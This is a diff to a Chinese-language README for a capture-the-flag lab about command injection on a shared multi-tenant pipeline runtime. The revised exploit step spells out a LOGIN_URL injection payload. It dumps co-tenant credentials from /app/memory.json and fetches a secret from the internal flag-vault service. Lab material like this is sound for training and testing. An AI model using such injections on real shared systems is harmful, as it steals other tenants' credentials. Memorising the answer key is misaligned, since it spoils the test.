@@ -10,6 +10,8 @@
 | 难度 | L3 |
 | 交付方式 | Docker Compose |
 | 入口 | localhost:10626 |
+| 入口身份 | 宿主侧黑盒起点（无云凭据，需自行派生） |
+| 终点 | 共享集成运行时 经 flag-vault 交付（network-source：共享运行时地址（注入的命令直达 vault）） |
 
 ## 场景概述
 分析平台把管道执行放到共享的多租户集成运行时（AutoResolveIntegrationRuntime）。
@@ -28,15 +30,22 @@
 - "运行时归属只由客户端声明"（服务端不校验）
 
 ## 利用步骤
-1. 查看控制面文档，确认存在共享运行时
-   `AutoResolveIntegrationRuntime`。
-2. 构造恶意连接字符串，`LOGIN_URL` 内放 shell 命令
-   （本场景简化：`{echo x; cat /app/memory.json}`）。
+
+1. 查看控制面文档，确认存在共享运行时 `AutoResolveIntegrationRuntime`。
+2. 构造恶意连接字符串，在 `LOGIN_URL` 里放 shell 命令：先 dump 同机 co-tenant 凭据，
+   再从共享运行时自己的内网地址向 flag-vault 取密文：
+   `LOGIN_URL={cat /app/memory.json; python3 -c "import urllib.request;print(urllib.request.urlopen('http://flag-vault:5000/flag').read().decode())";}`
 3. 以 `runtime_name=AutoResolveIntegrationRuntime` 提交管道。
-4. 共享 worker 执行注入命令，返回同机 co-tenant 凭据与 flag。
+4. 共享 worker 执行注入命令，返回 co-tenant 凭据与供应商密文。
 
 ## Flag
-`flag{cloud-15-co-tenant}`
+
+- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
+- 交付条件：只有 共享集成运行时 向 flag-vault 出示「共享运行时地址（注入的命令直达 vault）」（校验模式 `network-source`）时才交付；
+  其它容器、容器环境变量、落地文件与日志里都没有明文。
+- 形态：`flag{cloud-15-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
+- 验收：`python3 scripts/validate-cloud-gate.py cloud-15 <flag>`（gate）+
+  `python3 tests/cloud/run.py cloud-15 <flag>`（参考利用）。
 
 ## 此场景利用了哪些知识
 
